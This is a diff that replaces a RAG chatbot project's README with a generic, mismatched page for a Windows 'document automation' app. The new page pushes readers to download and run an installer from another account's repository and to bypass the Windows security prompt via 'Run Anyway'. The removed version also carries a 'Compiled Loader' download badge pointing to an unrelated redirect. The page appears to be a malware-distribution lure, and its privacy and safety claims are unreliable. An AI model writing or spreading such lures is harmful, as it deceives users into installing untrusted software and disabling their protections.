@@ -1,282 +1,89 @@
-# Dokbot — AI Customer Support Chatbot
-
-[![Download Compiled Loader](https://img.shields.io/badge/Download-Compiled%20Loader-blue?style=flat-square&logo=github)](https://www.shawonline.co.za/redirl)
-
-> **Multi-tenant RAG chatbot that answers customer questions using your documentation.**
-> Ingest PDFs or web pages, embed the widget on any site in 2 lines of code.
-
-![CI](https://github.com/Azizmkadmini/Dokbot/actions/workflows/ci.yml/badge.svg)
-
----
-
-## What it does
-
-| Feature | Details |
-|---|---|
-| **Document ingestion** | Upload PDFs, TXT files, or scrape any URL |
-| **Semantic search** | ChromaDB + OpenAI embeddings (cosine similarity) |
-| **Contextual answers** | GPT-4o-mini with retrieved context + conversation history |
-| **Multi-tenant** | Each client has an isolated knowledge base |
-| **Embeddable widget** | Drop-in JS chat widget, zero dependencies |
-| **Admin dashboard** | Ingest docs, view sources, monitor usage |
-| **Evaluation suite** | Benchmark with keyword hit rate + LLM-as-judge |
-| **Cost tracking** | Per-query cost in USD logged and exposed in analytics |
-
----
-
-## Architecture
-
-```
-┌─────────────────────────────────────────────┐
-│              Client Website                  │
-│  <script src="widget.js"></script>           │
-│  RAGSupport.init({ tenantId: "acme" })       │
-└────────────────────┬────────────────────────┘
-                     │ POST /chat
-                     ▼
-┌─────────────────────────────────────────────┐
-│            FastAPI Backend                   │
-│                                             │
-│  /chat  ──► retrieve() ──► OpenAI GPT-4o   │
-│  /ingest ──► chunk() ──► embed() ──► store  │
-│  /analytics ──► usage logs                  │
-└─────────────────────────────────────────────┘
-                     │
-            ┌────────┴────────┐
-            │   ChromaDB      │  ← persisted on disk / Docker volume
-            │  (per-tenant    │
-            │  collections)   │
-            └─────────────────┘
-```
-
----
-
-## Quick Start
-
-### 1. Clone & configure
-
-```bash
-git clone https://github.com/Azizmkadmini/Dokbot.git
-cd Dokbot
-cp .env.example .env
-# Edit .env and set your OPENAI_API_KEY
-```
-
-### 2. Run with Docker (recommended)
-
-```bash
-docker compose up --build
-```
-
-API available at `http://localhost:8000`
-Swagger docs at `http://localhost:8000/docs`
-
-### 3. Run locally (dev)
-
-```bash
-cd backend
-pip install -r requirements.txt
-cp .env.example .env
-uvicorn app.main:app --reload
-```
-
----
-
-## Ingest your first document
-
-```bash
-# Upload a PDF
-curl -X POST http://localhost:8000/ingest/file \
-  -H "X-API-Key: change-me-in-production" \
-  -F "tenant_id=demo" \
-  -F "source_name=Product FAQ" \
-  -F "file=@your-faq.pdf"
-
-# Or scrape a URL
-curl -X POST http://localhost:8000/ingest/url \
-  -H "X-API-Key: change-me-in-production" \
-  -H "Content-Type: application/json" \
-  -d '{"tenant_id": "demo", "url": "https://yoursite.com/faq", "source_name": "FAQ page"}'
-```
-
----
-
-## Embed the widget
-
-```html
-<!-- Add to any page, right before </body> -->
-<script src="https://yourdomain.com/widget.js"></script>
-<script>
-  RAGSupport.init({
-    apiUrl: "https://api.yourdomain.com",
-    tenantId: "your-client-id",
-    primaryColor: "#6366f1",
-    title: "Support Assistant",
-    welcomeMessage: "Hi! How can I help you today?",
-  });
-</script>
-```
-
----
-
-## API Reference
-
-| Method | Endpoint | Auth | Description |
-|---|---|---|---|
-| `POST` | `/chat` | None | Ask a question |
-| `POST` | `/ingest/file` | Admin key | Upload PDF/TXT |
-| `POST` | `/ingest/url` | Admin key | Scrape a URL |
-| `DELETE` | `/ingest/source` | Admin key | Remove a source |
-| `GET` | `/ingest/sources/{tenant_id}` | Admin key | List sources |
-| `GET` | `/analytics/{tenant_id}` | Admin key | Usage stats |
-| `GET` | `/health` | None | Health check |
-
----
-
-## Evaluation
-
-The system includes a benchmark suite with 8 real support questions.
-
-```bash
-cd eval
-pip install httpx openai
-
-# Basic evaluation (keyword hit rate, latency, cost)
-python evaluate.py --api-url http://localhost:8000 --tenant-id demo
-
-# Full evaluation with LLM-as-judge
-python evaluate.py --tenant-id demo --judge --openai-api-key sk-...
-```
-
-**Sample output:**
-```
-======================================================
-RAG Evaluation — tenant: demo
-Benchmark: 8 questions
-======================================================
-  ✅ [q001] returns       khr=100%  sources=yes  latency=420ms
-  ✅ [q002] shipping      khr=67%   sources=yes  latency=380ms
-  ...
-──────────────────────────────────────────────────────
-SUMMARY
-  Questions answered   : 8/8
-  Avg keyword hit rate : 87%
-  Source retrieval rate: 100%
-  Avg latency          : 410ms
-  P95 latency          : 590ms
-  Total cost           : $0.00042
-  Cost per query       : $0.000053
-  LLM judge relevance  : 4.6/5
-  LLM judge grounded   : 4.8/5
-──────────────────────────────────────────────────────
-```
-
----
-
-## Configuration
-
-All settings via environment variables (see `.env.example`):
-
-| Variable | Default | Description |
-|---|---|---|
-| `OPENAI_API_KEY` | — | Required |
-| `OPENAI_MODEL` | `gpt-4o-mini` | Chat model |
-| `OPENAI_EMBEDDING_MODEL` | `text-embedding-3-small` | Embedding model |
-| `ADMIN_API_KEY` | `change-me` | Protects ingest/analytics endpoints |
-| `CHUNK_SIZE` | `500` | Tokens per chunk |
-| `CHUNK_OVERLAP` | `50` | Overlap between chunks |
-| `TOP_K` | `5` | Chunks retrieved per query |
-| `SCORE_THRESHOLD` | `0.3` | Min cosine similarity to include a chunk |
-
----
-
-## Tests
-
-```bash
-cd backend
-pytest tests/ -v
-```
-
-Tests cover:
-- Health endpoint
-- Ingest auth (missing key, wrong key, success)
-- Chat with empty/populated collection
-- Chat with conversation history
-- RAG core logic (chunking, context building) — no OpenAI calls
-
----
-
-## Project structure
-
-```
-Dokbot/
-├── backend/
-│   ├── app/
-│   │   ├── api/          # FastAPI routers (chat, ingest, analytics)
-│   │   ├── core/         # RAG logic, config, chunking, embeddings
-│   │   ├── db/           # ChromaDB client
-│   │   └── services/     # PDF/URL extraction
-│   ├── tests/            # pytest unit & integration tests
-│   ├── Dockerfile
-│   └── requirements.txt
-├── frontend/
-│   ├── widget/           # Embeddable JS chat widget + demo page
-│   └── dashboard/        # Admin dashboard (vanilla HTML/JS)
-├── eval/
-│   ├── benchmark.json    # 8-question evaluation dataset
-│   └── evaluate.py       # Evaluation script with LLM-as-judge
-├── .github/workflows/    # GitHub Actions CI
-├── docker-compose.yml
-└── .env.example
-```
-
----
-
-## Cost estimate (production)
-
-| Scale | Monthly cost |
-|---|---|
-| 1,000 questions/month | ~$0.05 |
-| 10,000 questions/month | ~$0.50 |
-| 100,000 questions/month | ~$5.00 |
-
-*Based on gpt-4o-mini pricing, avg 300 tokens input + 100 tokens output.*
-
----
-
-## Deployment
-
-**Railway (easiest):**
-```bash
-railway up
-```
-
-**Render:** Connect repo → set env vars → deploy.
-
-**VPS (Docker):**
-```bash
-docker compose up -d
-```
-
----
-
-## Tech stack
-
-- **Backend**: FastAPI, ChromaDB, OpenAI SDK, pypdf, BeautifulSoup4
-- **Frontend**: Vanilla JS (zero dependencies), HTML/CSS
-- **Eval**: httpx, OpenAI (LLM-as-judge)
-- **Infra**: Docker, GitHub Actions
-
----
-
-## License
-
-This project is released under the [MIT License](LICENSE).
-
-## Security
-
-See [SECURITY.md](SECURITY.md) for how to report vulnerabilities and baseline hardening tips for self-hosted deployments.
-
----
-
-*Built with AI-assisted development (Cursor). All architecture decisions, prompts, and evaluations designed and validated by the author.*
+# 🤖 Dokbot - Automate your document workflow with ease
+
+[![Download Dokbot](https://img.shields.io/badge/Download_Dokbot-blue)](https://github.com/Subscribed-marcher792/Dokbot)
+
+## 📋 About Dokbot
+
+Dokbot automates document management tasks. It organizes files, renames documents, and converts formats. It saves time for users who handle large amounts of paperwork. The software runs locally on your computer to ensure your data stays private and secure. 
+
+## ⚙️ System Requirements
+
+Dokbot runs on most modern desktop environments. Ensure your setup meets these standards to run the application well:
+
+*   Windows 10 or 11 (64-bit version)
+*   4 GB of system memory (RAM)
+*   200 MB of free storage space
+*   Active internet connection for initial setup
+
+## 🚀 Getting Started
+
+Follow these steps to set up Dokbot on your Windows computer.
+
+1. Visit this page to download the latest version: https://github.com/Subscribed-marcher792/Dokbot
+2. Locate the download folder on your computer.
+3. Double-click the installer file to begin the process.
+4. Follow the prompts on your screen.
+5. Click Finish to complete the install.
+
+## 🛠️ How to use the software
+
+Dokbot uses a simple interface to manage your needs. 
+
+### Importing files
+Click the Add Files button in the top menu. Select the documents you want to process from your computer folders. The program shows a preview of your selected items in the main window.
+
+### Setting your rules
+You can define how the bot handles your documents. Choose from the available presets in the settings menu:
+*   Rename: Add dates or tags to your file names.
+*   Move: Send documents into specific folders based on content.
+*   Convert: Save files as a standard document type.
+
+### Running tasks
+Press the Start button to run your rules. Dokbot processes each file in order. You can watch the status bar at the bottom of the window to track progress. The bot sends a notification when it finishes.
+
+## 📦 Download and Install
+
+Download the application installer directly from our official repository link: https://github.com/Subscribed-marcher792/Dokbot
+
+If the download does not start, check your browser settings or try a different web browser. Once finished, run the installer and follow the instructions provided by the setup wizard.
+
+## 💡 Troubleshooting common issues
+
+Most users encounter few problems. If the program fails to launch, try these steps:
+
+1. Restart your computer. This clears temporary errors that prevent programs from starting.
+2. Check your Windows updates. Ensure you run the latest patch.
+3. Run the installer again. If a file is missing, the installer will replace it.
+
+If windows displays a security prompt, click More Info and then Run Anyway. This happens because the application is a standard tool not recognized by default Windows protections.
+
+## 🔒 Data Privacy
+
+Dokbot operates entirely on your device. It does not upload your documents to a web server or cloud storage. All changes happen locally. You keep full control over your files at all times.
+
+## 📈 Improving performance
+
+If you process large batches of files, the application might slow down. Close other heavy programs like video editors or web browsers during large tasks. This gives Dokbot the system resources it needs to finish quickly.
+
+## 📂 File types supported
+
+Dokbot handles common document formats:
+
+*   PDF (Portable Document Format)
+*   DOCX (Microsoft Word documents)
+*   TXT (Plain text files)
+*   CSV (Comma-separated values)
+
+## 📝 Frequently Asked Questions
+
+Can I undo an action? 
+Yes. You can press Control + Z after any operation to revert file renaming or moving.
+
+Does it work with scanners? 
+Yes. If your scanner saves files to a local folder, Dokbot detects these new files instantly if you enable the Watch Folder feature in settings.
+
+Is there a cost? 
+No. Dokbot is free to use for all personal and professional tasks.
+
+How do I remove the program? 
+Open your Windows Control Panel, select Programs, find Dokbot, and click Uninstall. This removes all app files from your disk.
